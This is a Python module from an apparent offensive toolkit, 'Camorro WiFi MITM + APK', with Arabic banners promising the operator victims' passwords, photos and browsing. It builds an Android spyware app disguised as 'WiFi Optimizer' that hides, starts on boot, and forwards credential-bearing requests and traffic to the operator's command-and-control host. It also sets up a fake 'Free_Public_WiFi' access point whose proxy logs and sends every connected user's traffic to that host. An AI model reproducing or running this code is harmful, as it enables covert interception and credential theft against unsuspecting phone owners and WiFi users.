#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro WiFi MITM + APK v3.0
APK يحول الجهاز المستهدف إلى نقطة MITM
يعترض كل حركة المرور ويسجل كلمات السر والصور
"""

import os
import json
import tempfile
from core.utils import print_status, pause, input_target, save_result, check_root, run_cmd
from core.colors import bcolors

class WiFiMITMAPK:
    def __init__(self):
        self.lhost = None
        self.interface = "wlan0"
        self.temp_dir = tempfile.mkdtemp(prefix="camorro_mitm_")

    def generate_mitm_apk(self):
        """Generate MITM APK that creates a rogue AP and intercepts traffic"""
        project_dir = os.path.join(self.temp_dir, "mitm_apk")
        os.makedirs(f"{project_dir}/app/src/main/java/com/camorro/mitm", exist_ok=True)
        os.makedirs(f"{project_dir}/app/src/main/res/xml", exist_ok=True)
        os.makedirs(f"{project_dir}/app/src/main/res/values", exist_ok=True)
        
        # ---- AndroidManifest.xml ----
        manifest = '''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.camorro.mitm">
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS"/>
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="WiFi Optimizer"
        android:supportsRtl="true">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:name=".ProxyService" android:exported="true" android:foregroundServiceType="dataSync"/>
        <receiver android:name=".BootReceiver" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
    </application>
</manifest>
'''
        with open(f"{project_dir}/app/src/main/AndroidManifest.xml", "w") as f:
            f.write(manifest)
        
        # ---- ProxyService.java ----
        proxy_java = '''
package com.camorro.mitm;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import java.io.*;
import java.net.*;
import java.util.concurrent.*;
import java.util.Base64;

public class ProxyService extends Service {
    private static final String SERVER_HOST = "%s";
    private static final int SERVER_PORT = %s;
    private ExecutorService pool;
    private ServerSocket proxyServer;
    
    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(1, getNotification());
        startProxy();
    }
    
    private void startProxy() {
        pool = Executors.newCachedThreadPool();
        try {
            proxyServer = new ServerSocket(8080);
            while (true) {
                Socket client = proxyServer.accept();
                pool.submit(new ProxyHandler(client));
            }
        } catch (Exception e) {}
    }
    
    class ProxyHandler implements Runnable {
        private Socket client;
        ProxyHandler(Socket client) { this.client = client; }
        
        public void run() {
            try {
                BufferedReader reader = new BufferedReader(new InputStreamReader(client.getInputStream()));
                String requestLine = reader.readLine();
                if (requestLine == null) return;
                
                String[] parts = requestLine.split(" ");
                if (parts.length < 3) return;
                
                String method = parts[0];
                String url = parts[1];
                
                // Log request
                String log = "[" + method + "] " + url + "\\n";
                
                // Check for credentials in URL
                if (url.contains("login") || url.contains("password") || url.contains("auth")) {
                    // Exfiltrate immediately
                    try {
                        Socket c2 = new Socket(SERVER_HOST, SERVER_PORT);
                        PrintWriter out = new PrintWriter(c2.getOutputStream());
                        out.println("[CRED] " + url);
                        out.flush();
                        // Read full request body
                        StringBuilder body = new StringBuilder();
                        while (reader.ready()) {
                            body.append((char)reader.read());
                        }
                        out.println("[BODY] " + body.toString());
                        out.flush();
                        c2.close();
                    } catch (Exception e) {}
                }
                
                // Forward to C2 server
                try {
                    Socket c2 = new Socket(SERVER_HOST, SERVER_PORT);
                    PrintWriter out = new PrintWriter(c2.getOutputStream());
                    out.println("[TRAFFIC] " + requestLine);
                    out.flush();
                    
                    // Forward headers and body
                    String line;
                    while ((line = reader.readLine()) != null && !line.isEmpty()) {
                        out.println(line);
                    }
                    out.println();
                    
                    // Read client body if exists
                    if (method.equals("POST")) {
                        int contentLength = 0;
                        // Would need to parse Content-Length
                    }
                    
                    out.flush();
                    
                    // Read response from C2 and send back
                    BufferedReader c2Reader = new BufferedReader(new InputStreamReader(c2.getInputStream()));
                    PrintWriter clientOut = new PrintWriter(client.getOutputStream());
                    String respLine;
                    while ((respLine = c2Reader.readLine()) != null) {
                        clientOut.println(respLine);
                    }
                    clientOut.flush();
                    
                    c2.close();
                } catch (Exception e) {}
                
                client.close();
            } catch (Exception e) {}
        }
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel("proxy", "Proxy Service", NotificationManager.IMPORTANCE_LOW);
            ((NotificationManager) getSystemService(NOTIFICATION_SERVICE)).createNotificationChannel(channel);
        }
    }
    
    private Notification getNotification() {
        return new Notification.Builder(this, "proxy")
            .setContentTitle("WiFi Optimizer")
            .setContentText("Optimizing network...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .build();
    }
    
    @Override
    public IBinder onBind(Intent intent) { return null; }
}
''' % (self.lhost, self.lport)
        
        with open(f"{project_dir}/app/src/main/java/com/camorro/mitm/ProxyService.java", "w") as f:
            f.write(proxy_java)
        
        # ---- MainActivity.java ----
        main_java = '''
package com.camorro.mitm;

import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent intent = new Intent(this, ProxyService.class);
        startService(intent);
        moveTaskToBack(true);
        finish();
    }
}
'''
        with open(f"{project_dir}/app/src/main/java/com/camorro/mitm/MainActivity.java", "w") as f:
            f.write(main_java)
        
        # ---- Build script ----
        build_sh = f'''#!/bin/bash
cd {project_dir}
mkdir -p app/src/main/res/values
echo '<?xml version="1.0" encoding="utf-8"?><resources><string name="app_name">WiFi Optimizer</string></resources>' > app/src/main/res/values/strings.xml
cat > app/build.gradle << 'GRADLE'
apply plugin: 'com.android.application'
android {{ compileSdk 33; defaultConfig {{ minSdk 21; targetSdk 33; }}; buildTypes {{ release {{ minifyEnabled false }} }} }}
dependencies {{ implementation 'androidx.appcompat:appcompat:1.6.1' }}
GRADLE
mkdir -p app/src/main/res/mipmap-hdpi
# Build
gradle wrapper --gradle-version 8.0 2>/dev/null || true
./gradlew assembleRelease 2>&1
cp app/build/outputs/apk/release/app-release.apk ../../camorro_wifi_mitm.apk
echo "APK generated!"
'''
        with open(f"{project_dir}/build.sh", "w") as f:
            f.write(build_sh)
        os.chmod(f"{project_dir}/build.sh", 0o755)
        
        return project_dir

    def start_rogue_ap(self):
        """Start rogue access point and MITM proxy"""
        print_status("Setting up rogue AP + MITM proxy...", "info")
        
        # Check for required tools
        for tool in ["hostapd", "dnsmasq", "iptables"]:
            if not os.path.exists(f"/usr/sbin/{tool}") and not os.path.exists(f"/usr/bin/{tool}"):
                print_status(f"Install: apt install {tool}", "warn")
        
        ap_config = os.path.join(self.temp_dir, "hostapd.conf")
        with open(ap_config, "w") as f:
            f.write(f"""
interface={self.interface}
driver=nl80211
ssid=Free_Public_WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=camorro123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
""")
        
        dns_config = os.path.join(self.temp_dir, "dnsmasq.conf")
        with open(dns_config, "w") as f:
            f.write(f"""
interface={self.interface}
dhcp-range=192.168.10.10,192.168.10.100,12h
dhcp-option=3,192.168.10.1
dhcp-option=6,192.168.10.1
server=8.8.8.8
log-queries
log-dhcp
""")
        
        scripts_dir = os.path.join(self.temp_dir, "scripts")
        os.makedirs(scripts_dir, exist_ok=True)
        
        # Start script
        start_script = f'''#!/bin/bash
# Camorro MITM Rogue AP Launcher
INTERFACE={self.interface}
C2_HOST={self.lhost}
C2_PORT={self.lport}

echo "[*] Starting rogue AP on $INTERFACE..."
echo "[*] SSID: Free_Public_WiFi | Pass: camorro123"
echo "[*] C2: $C2_HOST:$C2_PORT"

# Configure interface
ip link set $INTERFACE down
ip addr flush dev $INTERFACE
ip link set $INTERFACE up
ip addr add 192.168.10.1/24 dev $INTERFACE

# Start services
hostapd {ap_config} -B
dnsmasq -C {dns_config}

# NAT
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i $INTERFACE -o eth0 -j ACCEPT
iptables -A FORWARD -i eth0 -o $INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT

echo "[+] Rogue AP running. Redirecting HTTP traffic to proxy..."

# Redirect port 80 to our proxy
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port 8080

# Start Python MITM proxy
echo "[*] Starting MITM proxy..."
cat > /tmp/mitm_proxy.py << 'PYEOF'
import socket, threading, select, sys, os, json
from datetime import datetime

C2_HOST = "{self.lhost}"
C2_PORT = {self.lport}

def handle_client(client_sock, addr):
    try:
        request = client_sock.recv(65536)
        if not request:
            client_sock.close()
            return
        
        # Extract first line
        first_line = request.split(b"\\r\\n")[0].decode(errors='ignore')
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {addr[0]} - {first_line[:100]}")
        
        # Log to C2
        try:
            c2 = socket.socket()
            c2.connect((C2_HOST, C2_PORT))
            c2.send(json.dumps({{
                "type": "traffic",
                "src": addr[0],
                "request": first_line[:200],
                "raw": request[:2000].decode(errors='ignore')
            }}).encode() + b"\\n")
            c2.close()
        except:
            pass
        
        # Save to file
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        with open(f'/tmp/mitm_{addr[0].replace(\".\",\"_\")}_{timestamp}.txt', 'wb') as f:
            f.write(request)
        
        # Forward to real destination
        try:
            # Extract host from request
            host_start = request.find(b"Host: ")
            if host_start >= 0:
                host_end = request.find(b"\\r\\n", host_start)
                host = request[host_start+6:host_end].decode(errors='ignore').strip()
                port = 443 if b"CONNECT" in request else 80
                
                target = socket.socket()
                target.connect((host, port))
                
                if b"CONNECT" in request:
                    client_sock.send(b"HTTP/1.1 200 Connection established\\r\\n\\r\\n")
                    # Tunnel traffic
                    while True:
                        r, _, _ = select.select([client_sock, target], [], [], 60)
                        if client_sock in r:
                            data = client_sock.recv(65536)
                            if not data: break
                            target.send(data)
                        if target in r:
                            data = target.recv(65536)
                            if not data: break
                            client_sock.send(data)
                else:
                    target.send(request)
                    response = target.recv(65536)
                    client_sock.send(response)
                
                target.close()
        except Exception as e:
            client_sock.send(b"HTTP/1.1 502 Bad Gateway\\r\\n\\r\\n<html><body><h2>Error</h2></body></html>")
        
        client_sock.close()
    except Exception as e:
        print(f"Error: {e}", file=sys.stderr)

def main():
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 8080))
    server.listen(100)
    print("[*] MITM proxy on :8080")
    while True:
        client, addr = server.accept()
        threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()

if __name__ == "__main__":
    main()
PYEOF

python3 /tmp/mitm_proxy.py
'''
        
        with open(f"{scripts_dir}/start_rogue_ap.sh", "w") as f:
            f.write(start_script)
        os.chmod(f"{scripts_dir}/start_rogue_ap.sh", 0o755)
        
        return scripts_dir

    def run(self, target=None):
        print(f"""
{bcolors.CYAN}╔══════════════════════════════════════════════════════════╗
║       CAMORRO WiFi MITM + APK v3.0                    ║
║   ينشئ شبكة WiFi وهمية + APK يرسل كل الحركة لك        ║
║   يعترض كلمات السر، الصور، المواقع — كل شيء           ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        self.lhost = input_target("Your IP (C2 server)")
        self.lport = input("C2 Port [9999]: ").strip() or "9999"
        
        print("Select attack vector:")
        print("  1) Rogue AP (create fake WiFi network) — requires 2nd WiFi card")
        print("  2) APK (send app that proxies traffic via your server)")
        print("  3) Both")
        
        choice = input(f"\n{bcolors.GREEN}mitm>{bcolors.ENDC} ").strip() or "2"
        
        if choice in ("1", "3"):
            self.interface = input("WiFi interface for AP [wlan0]: ").strip() or "wlan0"
            if check_root():
                scripts = self.start_rogue_ap()
                print_status(f"Rogue AP scripts: {scripts}", "ok")
            else:
                print_status("Root required for rogue AP", "err")
        
        if choice in ("2", "3"):
            project = self.generate_mitm_apk()
            print_status(f"APK project: {project}", "ok")
        
        print(f"""
{bcolors.GREEN}╔══════════════════════════════════════════════════════════╗
║  ✅ MITM READY!                                            ║
║                                                           ║
║  ▶️  Start C2 listener (receive intercepted data):         ║
║     nc -lvnp {self.lport}                                      ║
║                                                           ║
║  ▶️  طريقة 1 — Rogue AP:                                   ║
║     bash {os.path.join(self.temp_dir, 'scripts/start_rogue_ap.sh')}║
║     SSID: Free_Public_WiFi | Pass: camorro123             ║
║     كل من يتصل — نمرر كل حركته لك 🎯                      ║
║                                                           ║
║  ▶️  طريقة 2 — APK:                                       ║
║     ثبّت APK على الجهاز المستهدف                          ║
║     APK يحول الجهاز إلى Proxy ويعيد توجيه كل الحركة       ║
║     كل المواقع، كلمات السر، الصور — تصل إليك              ║
║                                                           ║
║  📁 MITM logs saved to: /tmp/mitm_*.txt                   ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        save_result(
            f"logs/mitm_{self.lhost}.txt",
            f"SSID: Free_Public_WiFi\nPass: camorro123\nC2: {self.lhost}:{self.lport}"
        )
        
        pause()

if __name__ == "__main__":
    WiFiMITMAPK().run()
